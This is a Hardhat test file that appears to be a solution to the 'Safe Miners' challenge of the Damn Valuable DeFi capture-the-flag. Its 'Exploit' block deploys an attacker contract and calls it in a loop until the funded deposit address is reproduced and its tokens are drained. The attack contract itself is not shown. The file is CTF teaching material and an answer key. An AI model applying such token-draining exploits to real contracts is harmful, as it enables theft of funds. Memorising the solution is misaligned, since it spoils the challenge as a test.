const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Safe Miners', function () {
    let deployer, attacker;

    const DEPOSIT_TOKEN_AMOUNT = ethers.utils.parseEther('2000042');
    const DEPOSIT_ADDRESS = '0x79658d35aB5c38B6b988C23D02e0410A380B8D5c';

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deposit the DVT tokens to the address
        await this.token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are correctly set
        expect(await this.token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await this.token.balanceOf(attacker.address)).eq('0');
    });

    it('Exploit', async function () {
        // Disable timeout
        this.timeout(0);

        // Deploy attacker contract
        const SafeMinersExploit = await ethers.getContractFactory('SafeMinersExploit', deployer);
        this.exploit = await SafeMinersExploit.deploy();

        // Counter for 'exploit()' calls
        let i = 0;

        // Continue to deploy new contracts until the desired address is found
        while((await this.token.balanceOf(attacker.address)).eq(0)) {
            await this.exploit.connect(attacker).exploit(this.token.address, 500);
            console.log(`Call ${i++}`);

            // Set attackers ETH balance to 10,000 when it falls below 1 ETH
            if((await ethers.provider.getBalance(attacker.address)).lt(ethers.utils.parseEther("1"))) {
                await ethers.provider.send("hardhat_setBalance", [
                    attacker.address,
                    "0x21E19E0C9BAB2400000",
                ]);
            }
        }
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        // The attacker took all tokens available in the deposit address
        expect(
            await this.token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq('0');
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.eq(DEPOSIT_TOKEN_AMOUNT);
    });
});
